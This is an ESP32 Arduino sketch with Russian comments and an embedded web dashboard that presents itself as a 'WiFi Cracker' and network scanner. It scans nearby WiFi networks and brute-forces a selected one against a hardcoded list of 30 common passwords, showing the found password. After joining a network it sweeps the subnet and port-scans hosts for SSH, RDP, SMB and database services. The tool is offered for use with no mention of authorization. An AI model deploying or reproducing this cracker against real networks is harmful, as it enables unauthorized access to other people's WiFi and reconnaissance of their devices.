#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <vector>
#include <map>

// ========== НАСТРОЙКИ ТОЧКИ ДОСТУПА ==========
const char* ap_ssid = "ESP32_Radar";
const char* ap_password = "shamshi006";

// ========== DNS ДЛЯ АВТООТКРЫТИЯ ==========
const byte DNS_PORT = 53;
DNSServer dnsServer;

// ========== НАСТРОЙКИ СКАНЕРА ==========
const unsigned long SCAN_INTERVAL = 5000;
const int MAX_DEVICES = 100;

// ========== ПОПУЛЯРНЫЕ ПАРОЛИ (30 ШТУК) ==========
const char* commonPasswords[] = {
  "12345678", "123456789", "1234567890", "000messi", "password",
  "password123", "11111111", "00000000", "88888888", "99999999",
  "22222222", "33333333", "44444444", "55555555", "66666666",
  "77777777", "12121212", "12341234", "123123123", "999999999",
  "admin123", "adminadmin", "000000000", "111111111", "123123123",
  "01010101", "12121212", "67676767", "87654321", "987654321"
};
const int PASSWORD_COUNT = 30;

// ========== ПОПУЛЯРНЫЕ ПОРТЫ И ПРОТОКОЛЫ ==========
struct PortInfo {
  int port;
  String name;
  String protocol;
};

PortInfo commonPorts[] = {
  {21, "FTP", "File Transfer"},
  {22, "SSH", "Secure Shell"},
  {23, "Telnet", "Remote Access"},
  {25, "SMTP", "Email"},
  {53, "DNS", "Domain Name"},
  {80, "HTTP", "Web Server"},
  {110, "POP3", "Email"},
  {143, "IMAP", "Email"},
  {443, "HTTPS", "Secure Web"},
  {445, "SMB", "File Sharing"},
  {3306, "MySQL", "Database"},
  {3389, "RDP", "Remote Desktop"},
  {5432, "PostgreSQL", "Database"},
  {27017, "MongoDB", "Database"}
};
const int PORT_COUNT = 14;

// ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
WebServer server(80);
bool isCracking = false;
String targetSSID = "";
String targetMAC = "";
int currentPasswordIndex = 0;
String crackResult = "";
unsigned long lastCrackAttempt = 0;
const unsigned long CRACK_DELAY = 3000;

bool isScanningNetwork = false;
String currentScanTarget = "";
String scanResults = "";
unsigned long lastScanAttempt = 0;

// ========== ОПРЕДЕЛЕНИЕ ПРОИЗВОДИТЕЛЯ ==========
String getManufacturer(String mac) {
  String prefix = mac.substring(0, 8);
  prefix.toUpperCase();
  
  if (prefix == "D4:0B:1A" || prefix == "34:E6:D7") return "🍎 Apple";
  if (prefix == "8C:3A:E3" || prefix == "C4:2C:1A") return "📱 Samsung";
  if (prefix == "00:1A:11" || prefix == "D8:A0:1C") return "📱 Xiaomi";
  if (prefix == "A4:50:46") return "📱 Huawei";
  if (prefix == "68:DB:F5" || prefix == "04:FE:31") return "🔍 Google";
  if (prefix == "00:22:68" || prefix == "4C:66:41") return "💻 Intel";
  if (prefix == "B8:27:EB") return "🍓 Raspberry Pi";
  if (prefix == "E4:5F:01" || prefix == "DC:A6:32") return "📡 TP-Link";
  if (prefix == "70:81:EB") return "💻 Microsoft";
  if (prefix == "FC:F5:28") return "🎮 Sony";
  if (prefix == "00:11:22") return "🔧 ESP32";
  if (prefix == "C8:3C:85") return "🏠 Xiaomi IoT";
  
  return "❓ Unknown";
}

String getSignalIcon(int rssi) {
  if (rssi > -50) return "🟢";
  if (rssi > -60) return "🟡";
  if (rssi > -70) return "🟠";
  if (rssi > -80) return "🔴";
  return "⚫";
}

// ========== СКАНИРОВАНИЕ ПОРТОВ ==========
String scanPorts(String ip) {
  String result = "[";
  WiFiClient client;
  
  for (int i = 0; i < PORT_COUNT; i++) {
    if (client.connect(ip.c_str(), commonPorts[i].port, 500)) {
      if (i > 0) result += ",";
      result += "{\"port\":" + String(commonPorts[i].port) + 
                ",\"name\":\"" + commonPorts[i].name + "\"" +
                ",\"protocol\":\"" + commonPorts[i].protocol + "\"" +
                ",\"status\":\"open\"}";
      client.stop();
    }
    delay(50);
  }
  
  result += "]";
  return result;
}

// ========== ПОЛУЧЕНИЕ IP АДРЕСОВ В СЕТИ ==========
String scanNetworkDevices(String gatewayIP) {
  String result = "[";
  int found = 0;
  
  int lastDot = gatewayIP.lastIndexOf('.');
  String networkPrefix = gatewayIP.substring(0, lastDot + 1);
  
  for (int i = 1; i < 255 && found < 30; i++) {
    String ip = networkPrefix + String(i);
    
    if (pingIP(ip, 100)) {
      if (found > 0) result += ",";
      result += "{\"ip\":\"" + ip + "\"";
      result += ",\"mac\":\"" + getDeviceMAC(ip) + "\"";
      result += ",\"hostname\":\"" + getHostname(ip) + "\"";
      result += ",\"manufacturer\":\"" + getManufacturer(getDeviceMAC(ip)) + "\"";
      result += ",\"ports\":" + scanPorts(ip) + "}";
      found++;
    }
    delay(50);
  }
  
  result += "]";
  return result;
}

// ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
bool pingIP(String ip, int timeout) {
  WiFiClient client;
  return client.connect(ip.c_str(), 80, timeout);
}

String getDeviceMAC(String ip) {
  return "xx:xx:xx:xx:xx:xx";
}

String getHostname(String ip) {
  WiFiClient client;
  if (client.connect(ip.c_str(), 80, 200)) {
    client.println("GET / HTTP/1.1");
    client.println("Host: " + ip);
    client.println("Connection: close");
    client.println();
    
    unsigned long timeout = millis() + 500;
    while (client.available() == 0 && millis() < timeout);
    
    if (client.available()) {
      String line = client.readStringUntil('\n');
      if (line.indexOf("Server:") >= 0) {
        return line.substring(8, line.length() - 1);
      }
    }
    client.stop();
  }
  return "Unknown Device";
}

// ========== СКАНИРОВАНИЕ WiFi СЕТЕЙ ==========
String scanWiFiNetworks() {
  DynamicJsonDocument doc(32768);
  JsonArray devicesArray = doc.createNestedArray("networks");
  
  int networks = WiFi.scanNetworks();
  
  for (int i = 0; i < networks && i < MAX_DEVICES; i++) {
    JsonObject device = devicesArray.createNestedObject();
    
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "Hidden Network";
    
    device["mac"] = WiFi.BSSIDstr(i);
    device["name"] = ssid;
    device["rssi"] = WiFi.RSSI(i);
    device["channel"] = WiFi.channel(i);
    device["manufacturer"] = getManufacturer(WiFi.BSSIDstr(i));
    device["signal_icon"] = getSignalIcon(WiFi.RSSI(i));
  }
  
  WiFi.scanDelete();
  
  String output;
  serializeJson(doc, output);
  return output;
}

// ========== ПРОВЕРКА ПАРОЛЯ ==========
bool tryPassword(String ssid, String password) {
  WiFi.begin(ssid.c_str(), password.c_str());
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 15) {
    delay(500);
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    WiFi.disconnect();
    WiFi.mode(WIFI_AP_STA);
    return true;
  }
  
  return false;
}

void startCracking(String ssid, String mac) {
  targetSSID = ssid;
  targetMAC = mac;
  currentPasswordIndex = 0;
  isCracking = true;
  crackResult = "";
}

void processCracking() {
  if (!isCracking) return;
  
  if (currentPasswordIndex >= PASSWORD_COUNT) {
    isCracking = false;
    crackResult = "❌ Пароль не найден среди " + String(PASSWORD_COUNT) + " популярных паролей";
    return;
  }
  
  if (millis() - lastCrackAttempt < CRACK_DELAY) return;
  
  String currentPass = commonPasswords[currentPasswordIndex];
  lastCrackAttempt = millis();
  
  if (tryPassword(targetSSID, currentPass)) {
    isCracking = false;
    crackResult = "✅ ПАРОЛЬ НАЙДЕН: " + currentPass;
  } else {
    currentPasswordIndex++;
    if (currentPasswordIndex < PASSWORD_COUNT) {
      crackResult = "🔄 Перебор: " + String(currentPasswordIndex) + "/" + String(PASSWORD_COUNT) + " | Последний: " + currentPass + " ❌";
    }
  }
}

// ========== СКАНИРОВАНИЕ СЕТИ ПОСЛЕ ПОДКЛЮЧЕНИЯ ==========
void startNetworkScan(String gatewayIP) {
  currentScanTarget = gatewayIP;
  isScanningNetwork = true;
  scanResults = "";
  lastScanAttempt = millis();
}

void processNetworkScan() {
  if (!isScanningNetwork) return;
  
  if (millis() - lastScanAttempt < 1000) return;
  
  scanResults = scanNetworkDevices(currentScanTarget);
  isScanningNetwork = false;
}

// ========== HTML СТРАНИЦА ==========
String getHTML() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔍 ESP32 Ultimate Network Scanner</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1600px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; }
        .glow-text {
            font-size: 2.5em;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: linear-gradient(135deg, rgba(102,126,234,0.3), rgba(118,75,162,0.3));
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            color: white;
        }
        .stat-value { font-size: 2.5em; font-weight: bold; color: #fff; }
        .btn-group { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
        .btn {
            padding: 12px 28px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-primary { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
        .btn-success { background: linear-gradient(135deg, #11998e, #38ef7d); color: white; }
        .btn-danger { background: linear-gradient(135deg, #cb2d3e, #ef473a); color: white; }
        .btn-info { background: linear-gradient(135deg, #4facfe, #00f2fe); color: white; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; }
        .tab {
            padding: 12px 24px;
            background: rgba(255,255,255,0.1);
            border: none;
            color: white;
            cursor: pointer;
            border-radius: 8px;
        }
        .tab.active { background: #667eea; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .glass-card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .data-table { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; color: white; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
        th { background: rgba(0,0,0,0.3); }
        .port-open {
            display: inline-block;
            background: #10b981;
            color: white;
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 11px;
            margin: 2px;
        }
        .progress-container {
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        .progress-fill {
            background: linear-gradient(90deg, #00ffff, #00ff88);
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
        }
        @media (max-width: 768px) {
            .glow-text { font-size: 1.5em; }
            .btn { padding: 8px 16px; font-size: 12px; }
            th, td { font-size: 11px; padding: 8px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="glow-text">🔍 ESP32 Ultimate Network Scanner</h1>
            <p class="subtitle">WiFi Cracker | Port Scanner | Device Discovery | Network Intelligence</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card"><div class="stat-value" id="networkCount">0</div><div class="stat-label">🌐 WiFi сетей</div></div>
            <div class="stat-card"><div class="stat-value" id="deviceCount">0</div><div class="stat-label">📱 Устройств в сети</div></div>
            <div class="stat-card"><div class="stat-value" id="openPorts">0</div><div class="stat-label">🔓 Открытых портов</div></div>
            <div class="stat-card"><div class="stat-value" id="crackStatus">-</div><div class="stat-label">🔐 Статус подбора</div></div>
        </div>
        
        <div class="btn-group">
            <button class="btn btn-primary" onclick="refreshWiFi()">🔄 Сканировать WiFi</button>
            <button class="btn btn-success" onclick="startAutoRefresh()">▶ Авто-обновление</button>
            <button class="btn btn-danger" onclick="stopAutoRefresh()">⏹ Стоп</button>
            <button class="btn btn-info" onclick="exportData()">📥 Экспорт JSON</button>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="switchTab('wifi')">📡 WiFi Сети</button>
            <button class="tab" onclick="switchTab('cracker')">🔐 WiFi Cracker</button>
            <button class="tab" onclick="switchTab('network')">🌍 Сетевой сканер</button>
            <button class="tab" onclick="switchTab('ports')">🔌 Порты и протоколы</button>
            <button class="tab" onclick="switchTab('stats')">📊 Статистика</button>
        </div>
        
        <div id="tab-wifi" class="tab-content active">
            <div class="glass-card">
                <table id="wifiTable">
                    <thead><tr><th>📶</th><th>📱 SSID</th><th>🖥 MAC</th><th>📊 RSSI</th><th>🏭 Производитель</th><th>📡 Канал</th><th>🎯</th></tr></thead>
                    <tbody><tr><td colspan="7" style="text-align:center;">🔍 Нажмите Сканировать WiFi</td></tr>
                </tbody>
            </table>
            </div>
        </div>
        
        <div id="tab-cracker" class="tab-content">
            <div class="glass-card">
                <h3>🔐 Подбор пароля WiFi</h3>
                <p>Выберите сеть из списка выше и нажмите "СТАРТ" - будет перебрано 30 паролей</p>
                <div id="crackerPanel" style="display:none;">
                    <div class="progress-container"><div class="progress-fill" id="crackProgress" style="width:0%">0%</div></div>
                    <div id="crackInfo" style="color:white; margin-top:10px;"></div>
                </div>
            </div>
        </div>
        
        <div id="tab-network" class="tab-content">
            <div class="glass-card">
                <button class="btn btn-success" onclick="scanNetwork()">🚀 Начать сканирование сети</button>
                <div id="networkDevices" style="margin-top:15px;"></div>
            </div>
        </div>
        
        <div id="tab-ports" class="tab-content">
            <div class="glass-card">
                <table id="portsTable">
                    <thead><tr><th>Порт</th><th>Название</th><th>Протокол</th><th>Описание</th></tr></thead>
                    <tbody id="portsList"></tbody>
                </table>
            </div>
        </div>
        
        <div id="tab-stats" class="tab-content">
            <div class="glass-card">
                <canvas id="statsChart" style="max-height:300px;"></canvas>
            </div>
        </div>
    </div>
    
    <script>
        let refreshInterval = null, statusInterval = null, statsChart = null;
        
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById('tab-' + tab).classList.add('active');
        }
        
        async function refreshWiFi() {
            try {
                const response = await fetch('/api/wifi_scan');
                const data = await response.json();
                const networks = data.networks || [];
                document.getElementById('networkCount').innerHTML = networks.length;
                const tbody = document.querySelector('#wifiTable tbody');
                if (networks.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">❌ Сетей не найдено</td></tr>';
                    return;
                }
                tbody.innerHTML = networks.map(net => `
                    <tr>
                        <td>${net.signal_icon}</td>
                        <td><strong>${escapeHtml(net.name)}</strong></td>
                        <td><code>${net.mac}</code></td>
                        <td>${net.rssi} dBm</td>
                        <td>${net.manufacturer}</td>
                        <td>${net.channel}</td>
                        <td><button class="btn btn-info" style="padding:5px 10px;" onclick="startCrack('${escapeHtml(net.name)}', '${net.mac}')">🎯 СТАРТ</button></td>
                    </tr>
                `).join('');
            } catch(e) { console.error(e); }
        }
        
        async function startCrack(ssid, mac) {
            if (!confirm(`🔓 Начать подбор пароля для:\n"${ssid}"\n\n🔐 Будет перебрано 30 популярных паролей!\n⏱ Время: ~1.5 минуты`)) return;
            const response = await fetch('/api/start_crack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ssid: ssid, mac: mac })
            });
            if (response.ok) {
                document.getElementById('crackerPanel').style.display = 'block';
                document.querySelectorAll('.tab')[1].click();
                startStatusUpdates();
            }
        }
        
        async function getCrackStatus() {
            try {
                const response = await fetch('/api/crack_status');
                const data = await response.json();
                if (data.isCracking) {
                    const progress = (data.currentIndex / 30) * 100;
                    document.getElementById('crackProgress').style.width = progress + '%';
                    document.getElementById('crackProgress').innerHTML = Math.round(progress) + '%';
                    document.getElementById('crackInfo').innerHTML = `<div>🎯 ${data.targetSSID}</div><div>🔑 ${data.currentIndex}/30</div><div>${data.result}</div>`;
                    document.getElementById('crackStatus').innerHTML = `🔄 ${data.currentIndex}/30`;
                } else if (data.result) {
                    document.getElementById('crackInfo').innerHTML = `<div style="color:${data.result.includes('✅')?'#0f0':'#f00'}">${data.result}</div>`;
                    document.getElementById('crackStatus').innerHTML = data.result.includes('✅') ? '✅ Найден' : '❌ Не найден';
                    stopStatusUpdates();
                }
            } catch(e) {}
        }
        
        async function scanNetwork() {
            document.getElementById('networkDevices').innerHTML = '<div class="progress-container"><div class="progress-fill">🔍 Сканирование...</div></div>';
            const response = await fetch('/api/network_scan');
            const data = await response.json();
            if (data.devices && data.devices.length > 0) {
                document.getElementById('deviceCount').innerHTML = data.devices.length;
                let openPortsTotal = 0;
                let html = '<div class="data-table"><table><thead><tr><th>IP</th><th>Hostname</th><th>Производитель</th><th>Открытые порты</th></tr></thead><tbody>';
                data.devices.forEach(device => {
                    let ports = '';
                    if (device.ports) {
                        device.ports.forEach(p => {
                            if (p.status === 'open') {
                                ports += `<span class="port-open">${p.name}(${p.port})</span>`;
                                openPortsTotal++;
                            }
                        });
                    }
                    html += `<tr><td>${device.ip}</td><td>${device.hostname}</td><td>${device.manufacturer}</td><td>${ports || '❌ Нет открытых портов'}</td></tr>`;
                });
                html += '</tbody></table></div>';
                document.getElementById('networkDevices').innerHTML = html;
                document.getElementById('openPorts').innerHTML = openPortsTotal;
            } else {
                document.getElementById('networkDevices').innerHTML = '<p>❌ Устройств не найдено</p>';
            }
        }
        
        function loadPortsList() {
            const ports = [{port:21,name:"FTP"},{port:22,name:"SSH"},{port:23,name:"Telnet"},{port:80,name:"HTTP"},{port:443,name:"HTTPS"},{port:3306,name:"MySQL"},{port:3389,name:"RDP"}];
            document.getElementById('portsList').innerHTML = ports.map(p => `<tr><td>${p.port}</td><td><strong>${p.name}</strong></td><td>TCP</td><td>-</td></tr>`).join('');
        }
        
        function initChart() {
            const ctx = document.getElementById('statsChart').getContext('2d');
            statsChart = new Chart(ctx, { type: 'line', data: { labels: ['1','2','3','4','5','6','7','8','9','10'], datasets: [{ label: 'Устройства', data: [0,0,0,0,0,0,0,0,0,0], borderColor: '#667eea' }, { label: 'Порты', data: [0,0,0,0,0,0,0,0,0,0], borderColor: '#38ef7d' }] }, options: { responsive: true } });
        }
        
        function startAutoRefresh() { if (refreshInterval) clearInterval(refreshInterval); refreshInterval = setInterval(refreshWiFi, 5000); }
        function stopAutoRefresh() { if (refreshInterval) clearInterval(refreshInterval); refreshInterval = null; }
        function startStatusUpdates() { if (statusInterval) clearInterval(statusInterval); statusInterval = setInterval(getCrackStatus, 1000); getCrackStatus(); }
        function stopStatusUpdates() { if (statusInterval) clearInterval(statusInterval); statusInterval = null; }
        function exportData() { alert('Экспорт'); }
        function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
        
        refreshWiFi();
        loadPortsList();
        initChart();
        startAutoRefresh();
    </script>
</body>
</html>
)rawliteral";
}

// ========== HTTP ОБРАБОТЧИКИ ==========
void handleRoot() { server.send(200, "text/html", getHTML()); }
void handleWiFiScan() { server.send(200, "application/json", scanWiFiNetworks()); }

void handleStartCrack() {
  if (server.hasArg("plain")) {
    DynamicJsonDocument doc(256);
    deserializeJson(doc, server.arg("plain"));
    startCracking(doc["ssid"].as<String>(), doc["mac"].as<String>());
    server.send(200, "application/json", "{\"success\":true}");
  } else {
    server.send(400, "application/json", "{\"success\":false}");
  }
}

void handleCrackStatus() {
  DynamicJsonDocument doc(256);
  doc["isCracking"] = isCracking;
  doc["targetSSID"] = targetSSID;
  doc["currentIndex"] = currentPasswordIndex;
  doc["result"] = crackResult;
  String output; serializeJson(doc, output);
  server.send(200, "application/json", output);
}

void handleNetworkScan() {
  String result = "{\"devices\":" + scanNetworkDevices(WiFi.gatewayIP().toString()) + "}";
  server.send(200, "application/json", result);
}

void handleNotFound() {
  server.sendHeader("Location", "http://192.168.4.1", true);
  server.send(302, "text/plain", "");
}

// ========== SETUP ==========
void setup() {
  Serial.begin(115200);
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  server.on("/", handleRoot);
  server.on("/api/wifi_scan", handleWiFiScan);
  server.on("/api/start_crack", HTTP_POST, handleStartCrack);
  server.on("/api/crack_status", handleCrackStatus);
  server.on("/api/network_scan", handleNetworkScan);
  server.onNotFound(handleNotFound);
  server.begin();
  
  Serial.println("=================================");
  Serial.println("✅ Сервер запущен!");
  Serial.print("📡 WiFi: "); Serial.println(ap_ssid);
  Serial.print("🔑 Пароль: "); Serial.println(ap_password);
  Serial.print("🌐 IP: http://"); Serial.println(WiFi.softAPIP());
  Serial.print("🔐 Паролей для брутфорса: "); Serial.println(PASSWORD_COUNT);
  Serial.println("=================================");
}

// ========== LOOP ==========
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  processCracking();
  processNetworkScan();
  delay(10);
}
